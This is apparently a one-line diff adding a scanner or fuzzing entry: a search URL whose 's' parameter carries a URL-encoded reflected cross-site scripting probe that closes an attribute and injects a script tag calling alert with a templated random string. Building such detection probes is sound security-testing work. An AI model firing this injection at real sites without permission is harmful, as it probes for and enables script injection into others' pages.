@@ -1,0 +1,1 @@
+/?post_type=post&s=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3C/script%3E 
